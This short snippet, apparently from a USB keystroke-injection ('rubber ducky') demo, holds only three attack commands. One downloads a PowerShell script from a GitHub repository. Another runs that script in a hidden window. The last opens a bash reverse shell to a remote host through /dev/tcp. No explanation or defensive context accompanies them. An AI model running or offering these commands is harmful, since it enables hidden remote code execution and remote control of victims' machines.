curl https://github.com/lassemand/rubberducky_demo/blob/master/helper.ps1 -O

Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList '-NoExit -Command .\helper.ps1'

bash -c 'exec bash -i &>/dev/tcp/$RHOST/1234 <&1'
